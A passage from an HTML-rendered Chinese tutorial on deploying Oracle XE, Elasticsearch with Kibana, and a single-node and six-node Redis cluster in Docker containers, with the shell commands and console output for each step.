data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -h oracle --name oracle -d -p 49160:22 -p 49161:1521 -p 49162:8080 oracleinanutshell/oracle-xe-11g</span>237db949020abf2cee12e3193fa8a34d9dfadaafd9d5604564668d4472abe0b2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE                             COMMAND                  CREATED         STATUS         PORTS                                                                                                                               NAMES237db949020a   oracleinanutshell/oracle-xe-11g   <span class="token string">"/bin/sh -c '/usr/sb…"</span>   7 seconds ago   Up 4 seconds   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:49160-&gt;22/tcp<span class="token punctuation">,</span> :::49160-&gt;22/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:49161-&gt;1521/tcp<span class="token punctuation">,</span> :::49161-&gt;1521/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:49162-&gt;8080/tcp<span class="token punctuation">,</span> :::49162-&gt;8080/tcp   oracle<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">说明：49160 为ssh端口49161 为sqlplus端口49162 为oem端口<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">oracle数据库连接信息port:49161sid:xeusername:systempassword:oracleSYS用户密码为:oracle<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5-3-下载客户端连接工具"><a href="#5-3-下载客户端连接工具" class="headerlink" title="5.3 下载客户端连接工具"></a>5.3 下载客户端连接工具</h2><p>下载链接地址：<a href="https://www.oracle.com/tools/downloads/sqldev-downloads.html">https://www.oracle.com/tools/downloads/sqldev-downloads.html</a></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212115409934.png" alt="image-20220212115409934"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212115556498.png" alt="image-20220212115556498"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212115858640.png" alt="image-20220212115858640"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212115929175.png" alt="image-20220212115929175"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212120017387.png" alt="image-20220212120017387"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212120525692.png" alt="image-20220212120525692"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212120808803.png" alt="image-20220212120808803"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212120839513.png" alt="image-20220212120839513"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212120910215.png" alt="image-20220212120910215"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212120952721.png" alt="image-20220212120952721"></p><h1 id="六、使用Docker容器实现ElasticSearch-Kibana部署"><a href="#六、使用Docker容器实现ElasticSearch-Kibana部署" class="headerlink" title="六、使用Docker容器实现ElasticSearch+Kibana部署"></a>六、使用Docker容器实现ElasticSearch+Kibana部署</h1><h2 id="6-1-获取参考资料"><a href="#6-1-获取参考资料" class="headerlink" title="6.1 获取参考资料"></a>6.1 获取参考资料</h2><h3 id="6-1-1-ES部署参考资料"><a href="#6-1-1-ES部署参考资料" class="headerlink" title="6.1.1 ES部署参考资料"></a>6.1.1 ES部署参考资料</h3><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212211742909.png" alt="image-20220212211742909"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212211840530.png" alt="image-20220212211840530"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212211857732.png" alt="image-20220212211857732"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212211950202.png" alt="image-20220212211950202"></p><h3 id="6-1-2-Kibana部署参考资料"><a href="#6-1-2-Kibana部署参考资料" class="headerlink" title="6.1.2 Kibana部署参考资料"></a>6.1.2 Kibana部署参考资料</h3><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212212223735.png" alt="image-20220212212223735"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212212245791.png" alt="image-20220212212245791"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212212305429.png" alt="image-20220212212305429"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212212341841.png" alt="image-20220212212341841"></p><h2 id="6-2-ES部署"><a href="#6-2-ES部署" class="headerlink" title="6.2 ES部署"></a>6.2 ES部署</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker pull elasticsearch:7.17.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># mkdir -p /opt/es/config</span><span class="token comment"># mkdir -p /opt/es/data</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># echo "http.host: 0.0.0.0" &gt;&gt; /opt/es/config/elasticsearch.yml</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># chmod -R 777 /opt/es/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run --name elasticsearch -p 9200:9200 -p 9300:9300 \</span><span class="token operator">-</span>e <span class="token string">"discovery.type=single-node"</span> \<span class="token operator">-</span>e ES_JAVA_OPTS=<span class="token string">"-Xms64m -Xmx512m"</span> \<span class="token operator">-</span>v <span class="token operator">/</span>opt/es/config/elasticsearch<span class="token punctuation">.</span>yml:<span class="token operator">/</span>usr/share/elasticsearch/config/elasticsearch<span class="token punctuation">.</span>yml \<span class="token operator">-</span>v <span class="token operator">/</span>opt/es/<span class="token keyword">data</span>:<span class="token operator">/</span>usr/share/elasticsearch/<span class="token keyword">data</span> \<span class="token operator">-</span>v <span class="token operator">/</span>opt/es/plugins:<span class="token operator">/</span>usr/share/elasticsearch/plugins \<span class="token operator">-</span>d elasticsearch:7<span class="token punctuation">.</span>17<span class="token punctuation">.</span>0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS          PORTS                                                                                  NAMESe1c306e6e5a3   elasticsearch:7<span class="token punctuation">.</span>17<span class="token punctuation">.</span>0   <span class="token string">"/bin/tini -- /usr/l…"</span>   22 seconds ago   Up 20 seconds   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:9200-&gt;9200/tcp<span class="token punctuation">,</span> :::9200-&gt;9200/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:9300-&gt;9300/tcp<span class="token punctuation">,</span> :::9300-&gt;9300/tcp   elasticsearch<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212224446838.png" alt="image-20220212224446838"></p><h2 id="6-3-Kibana部署"><a href="#6-3-Kibana部署" class="headerlink" title="6.3 Kibana部署"></a>6.3 Kibana部署</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker pull kibana:7.17.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run --name kibana -e ELASTICSEARCH_HOSTS=http://192.168.255.157:9200 -p 5601:5601 \</span><span class="token operator">-</span>d kibana:7<span class="token punctuation">.</span>17<span class="token punctuation">.</span>0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE                  COMMAND                  CREATED         STATUS         PORTS                                                                                  NAMESfb60e73f9cd5   kibana:7<span class="token punctuation">.</span>17<span class="token punctuation">.</span>0          <span class="token string">"/bin/tini -- /usr/l…"</span>   2 minutes ago   Up 2 minutes   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:5601-&gt;5601/tcp<span class="token punctuation">,</span> :::5601-&gt;5601/tcp                                              kibana<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212224524598.png" alt="image-20220212224524598"></p><h1 id="七、使用Docker容器实现Redis部署"><a href="#七、使用Docker容器实现Redis部署" class="headerlink" title="七、使用Docker容器实现Redis部署"></a>七、使用Docker容器实现Redis部署</h1><h2 id="7-1-获取参考资料"><a href="#7-1-获取参考资料" class="headerlink" title="7.1 获取参考资料"></a>7.1 获取参考资料</h2><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212225251173.png" alt="image-20220212225251173"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212225313006.png" alt="image-20220212225313006"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212225336437.png" alt="image-20220212225336437"></p><p><img src="Docker%E5%AE%B9%E5%99%A8%E5%8C%96%E9%83%A8%E7%BD%B2%E4%BC%81%E4%B8%9A%E7%BA%A7%E5%BA%94%E7%94%A8%E9%9B%86%E7%BE%A4.assets/image-20220212225412367.png" alt="image-20220212225412367"></p><h2 id="7-2-运行Redis容器"><a href="#7-2-运行Redis容器" class="headerlink" title="7.2 运行Redis容器"></a>7.2 运行Redis容器</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># mkdir -p /opt/redis/conf</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># touch /opt/redis/conf/redis.conf</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker run -p 6379:6379 --name redis -v /opt/redis/data:/data \</span><span class="token operator">-</span>v <span class="token operator">/</span>opt/redis/conf:<span class="token operator">/</span>etc/redis \<span class="token operator">-</span>d redis redis-server <span class="token operator">/</span>etc/redis/redis<span class="token punctuation">.</span>conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># docker ps</span>CONTAINER ID   IMAGE                  COMMAND                  CREATED          STATUS          PORTS                                                                                  NAMES9bd2b39cd92a   redis                  <span class="token string">"docker-entrypoint.s…"</span>   44 seconds ago   Up 42 seconds   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:6379-&gt;6379/tcp<span class="token punctuation">,</span> :::6379-&gt;6379/tcp                                              redis<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="7-3-验证"><a href="#7-3-验证" class="headerlink" title="7.3 验证"></a>7.3 验证</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># wget -O /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># yum -y install redis</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># redis-cli -h 192.168.255.157 -p 6379</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:6379&gt; <span class="token function">set</span> test1 aOK192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:6379&gt; get test1<span class="token string">"a"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-4-Redis集群"><a href="#7-4-Redis集群" class="headerlink" title="7.4 Redis集群"></a>7.4 Redis集群</h2><p>安装redis-cluster；3主3从方式，从为了同步备份，主进行slot数据分片</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">编辑运行多个redis容器脚本文件<span class="token comment"># vim redis-cluster.sh</span><span class="token comment"># cat redis-cluster.sh</span><span class="token keyword">for</span> port in $<span class="token punctuation">(</span>seq 8001 8006<span class="token punctuation">)</span><span class="token punctuation">;</span> \<span class="token keyword">do</span> \mkdir <span class="token operator">-</span>p <span class="token operator">/</span>mydata/redis/node-$<span class="token punctuation">{</span>port<span class="token punctuation">}</span><span class="token operator">/</span>conftouch <span class="token operator">/</span>mydata/redis/node-$<span class="token punctuation">{</span>port<span class="token punctuation">}</span><span class="token operator">/</span>conf/redis<span class="token punctuation">.</span>conf<span class="token function">cat</span> &lt;&lt; EOF &gt;<span class="token operator">/</span>mydata/redis/node-$<span class="token punctuation">{</span>port<span class="token punctuation">}</span><span class="token operator">/</span>conf/redis<span class="token punctuation">.</span>confport $<span class="token punctuation">{</span>port<span class="token punctuation">}</span>cluster-enabled yescluster-config-file nodes<span class="token punctuation">.</span>confcluster-node-timeout 5000cluster-announce-ip 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157cluster-announce-port $<span class="token punctuation">{</span>port<span class="token punctuation">}</span>cluster-announce-bus-port 1$<span class="token punctuation">{</span>port<span class="token punctuation">}</span>appendonly yesEOFdocker run <span class="token operator">-</span>p $<span class="token punctuation">{</span>port<span class="token punctuation">}</span>:$<span class="token punctuation">{</span>port<span class="token punctuation">}</span> <span class="token operator">-</span>p 1$<span class="token punctuation">{</span>port<span class="token punctuation">}</span>:1$<span class="token punctuation">{</span>port<span class="token punctuation">}</span> <span class="token operator">--</span>name redis-$<span class="token punctuation">{</span>port<span class="token punctuation">}</span> \<span class="token operator">-</span>v <span class="token operator">/</span>mydata/redis/node-$<span class="token punctuation">{</span>port<span class="token punctuation">}</span><span class="token operator">/</span><span class="token keyword">data</span>:<span class="token operator">/</span><span class="token keyword">data</span> \<span class="token operator">-</span>v <span class="token operator">/</span>mydata/redis/node-$<span class="token punctuation">{</span>port<span class="token punctuation">}</span><span class="token operator">/</span>conf/redis<span class="token punctuation">.</span>conf:<span class="token operator">/</span>etc/redis/redis<span class="token punctuation">.</span>conf \<span class="token operator">-</span>d redis:5<span class="token punctuation">.</span>0<span class="token punctuation">.</span>7 redis-server <span class="token operator">/</span>etc/redis/redis<span class="token punctuation">.</span>conf<span class="token punctuation">;</span> \done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">执行脚本<span class="token comment"># sh redis-cluster.sh</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">查看已运行容器<span class="token comment"># docker ps</span>CONTAINER ID   IMAGE         COMMAND                  CREATED              STATUS              PORTS                                                                                                NAMES8d53864a98ce   redis:5<span class="token punctuation">.</span>0<span class="token punctuation">.</span>7   <span class="token string">"docker-entrypoint.s…"</span>   About a minute ago   Up About a minute   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:8006-&gt;8006/tcp<span class="token punctuation">,</span> :::8006-&gt;8006/tcp<span class="token punctuation">,</span> 6379/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:18006-&gt;18006/tcp<span class="token punctuation">,</span> :::18006-&gt;18006/tcp   redis-8006e2b5da0f0605   redis:5<span class="token punctuation">.</span>0<span class="token punctuation">.</span>7   <span class="token string">"docker-entrypoint.s…"</span>   2 minutes ago        Up About a minute   0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:8005-&gt;8005/tcp<span class="token punctuation">,</span> :::8005-&gt;8005/tcp<span class="token punctuation">,</span> 6379/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:18005-&gt;18005/tcp<span class="token punctuation">,</span> :::18005-&gt;18005/tcp   redis-800570e8e8f15aea   redis:5<span class="token punctuation">.</span>0<span class="token punctuation">.</span>7   <span class="token string">"docker-entrypoint.s…"</span>   2 minutes ago        Up 2 minutes        0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:8004-&gt;8004/tcp<span class="token punctuation">,</span> :::8004-&gt;8004/tcp<span class="token punctuation">,</span> 6379/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:18004-&gt;18004/tcp<span class="token punctuation">,</span> :::18004-&gt;18004/tcp   redis-8004dff8e4bf02b4   redis:5<span class="token punctuation">.</span>0<span class="token punctuation">.</span>7   <span class="token string">"docker-entrypoint.s…"</span>   2 minutes ago        Up 2 minutes        0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:8003-&gt;8003/tcp<span class="token punctuation">,</span> :::8003-&gt;8003/tcp<span class="token punctuation">,</span> 6379/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:18003-&gt;18003/tcp<span class="token punctuation">,</span> :::18003-&gt;18003/tcp   redis-8003c34dc4c423ef   redis:5<span class="token punctuation">.</span>0<span class="token punctuation">.</span>7   <span class="token string">"docker-entrypoint.s…"</span>   2 minutes ago        Up 2 minutes        0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:8002-&gt;8002/tcp<span class="token punctuation">,</span> :::8002-&gt;8002/tcp<span class="token punctuation">,</span> 6379/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:18002-&gt;18002/tcp<span class="token punctuation">,</span> :::18002-&gt;18002/tcp   redis-8002b8cb5feffb43   redis:5<span class="token punctuation">.</span>0<span class="token punctuation">.</span>7   <span class="token string">"docker-entrypoint.s…"</span>   2 minutes ago        Up 2 minutes        0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:8001-&gt;8001/tcp<span class="token punctuation">,</span> :::8001-&gt;8001/tcp<span class="token punctuation">,</span> 6379/tcp<span class="token punctuation">,</span> 0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:18001-&gt;18001/tcp<span class="token punctuation">,</span> :::18001-&gt;18001/tcp   redis-8001<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">登录redis容器<span class="token comment"># docker exec -it redis-8001 bash</span>root@b8cb5feffb43:<span class="token operator">/</span><span class="token keyword">data</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">创建redis-clusterroot@b8cb5feffb43:<span class="token operator">/</span><span class="token keyword">data</span><span class="token comment"># redis-cli --cluster create 192.168.255.157:8001 192.168.255.157:8002 192.168.255.157:8003 192.168.255.157:8004 192.168.255.157:8005 192.168.255.157:8006 --cluster-replicas 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">输出：&gt;&gt;&gt; Performing hash slots allocation on 6 nodes<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>Master<span class="token punctuation">[</span>0<span class="token punctuation">]</span> <span class="token operator">-</span>&gt; Slots 0 <span class="token operator">-</span> 5460Master<span class="token punctuation">[</span>1<span class="token punctuation">]</span> <span class="token operator">-</span>&gt; Slots 5461 <span class="token operator">-</span> 10922Master<span class="token punctuation">[</span>2<span class="token punctuation">]</span> <span class="token operator">-</span>&gt; Slots 10923 <span class="token operator">-</span> 16383Adding replica 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8005 to 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8001Adding replica 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8006 to 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8002Adding replica 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8004 to 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8003&gt;&gt;&gt; Trying to optimize slaves allocation <span class="token keyword">for</span> anti-affinity<span class="token namespace">[WARNING]</span> Some slaves are in the same host as their masterM: abd07f1a2679fe77558bad3ff4b7ab70ec41efa5 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8001   slots:<span class="token punctuation">[</span>0-5460<span class="token punctuation">]</span> <span class="token punctuation">(</span>5461 slots<span class="token punctuation">)</span> masterM: 40e69202bb3eab13a8157c33da6240bb31f2fd6f 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8002   slots:<span class="token punctuation">[</span>5461-10922<span class="token punctuation">]</span> <span class="token punctuation">(</span>5462 slots<span class="token punctuation">)</span> masterM: 9a927abf3c2982ba9ffdb29176fc8ffa77a2cf03 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8003   slots:<span class="token punctuation">[</span>10923-16383<span class="token punctuation">]</span> <span class="token punctuation">(</span>5461 slots<span class="token punctuation">)</span> masterS: 81d0a4056328830a555fcd75cf523d4c9d52205c 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8004   replicates 9a927abf3c2982ba9ffdb29176fc8ffa77a2cf03S: 8121a28519e5b52e4817913aa3969d9431bb68af 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8005   replicates abd07f1a2679fe77558bad3ff4b7ab70ec41efa5S: 3a8dd5343c0b8f5580bc44f6b3bb5b4371d4dde5 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8006   replicates 40e69202bb3eab13a8157c33da6240bb31f2fd6fCan I <span class="token function">set</span> the above configuration? <span class="token punctuation">(</span><span class="token function">type</span> <span class="token string">'yes'</span> to accept<span class="token punctuation">)</span>: yes 输入yes&gt;&gt;&gt; Nodes configuration updated&gt;&gt;&gt; Assign a different config epoch to each node&gt;&gt;&gt; Sending CLUSTER MEET messages to join the clusterWaiting <span class="token keyword">for</span> the cluster to join<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>&gt;&gt;&gt; Performing Cluster Check <span class="token punctuation">(</span><span class="token keyword">using</span> node 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8001<span class="token punctuation">)</span>M: abd07f1a2679fe77558bad3ff4b7ab70ec41efa5 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8001   slots:<span class="token punctuation">[</span>0-5460<span class="token punctuation">]</span> <span class="token punctuation">(</span>5461 slots<span class="token punctuation">)</span> master   1 additional replica<span class="token punctuation">(</span>s<span class="token punctuation">)</span>S: 81d0a4056328830a555fcd75cf523d4c9d52205c 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8004   slots: <span class="token punctuation">(</span>0 slots<span class="token punctuation">)</span> slave   replicates 9a927abf3c2982ba9ffdb29176fc8ffa77a2cf03M: 40e69202bb3eab13a8157c33da6240bb31f2fd6f 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8002   slots:<span class="token punctuation">[</span>5461-10922<span class="token punctuation">]</span> <span class="token punctuation">(</span>5462 slots<span class="token punctuation">)</span> master   1 additional replica<span class="token punctuation">(</span>s<span class="token punctuation">)</span>S: 8121a28519e5b52e4817913aa3969d9431bb68af 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8005   slots: <span class="token punctuation">(</span>0 slots<span class="token punctuation">)</span> slave   replicates abd07f1a2679fe77558bad3ff4b7ab70ec41efa5M: 9a927abf3c2982ba9ffdb29176fc8ffa77a2cf03 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>255<span class="token punctuation">.</span>157:8003   slots:<span class="token punctuation">[</span>10923-16383<span class="token punctuation">]</span> <span class="token punctuation">(</span>5461 slots<span class="token punctuation">)</span> master   1 additional replica<span class="token punctuation">(</span>s<span class="token punctuation">)</span>S: 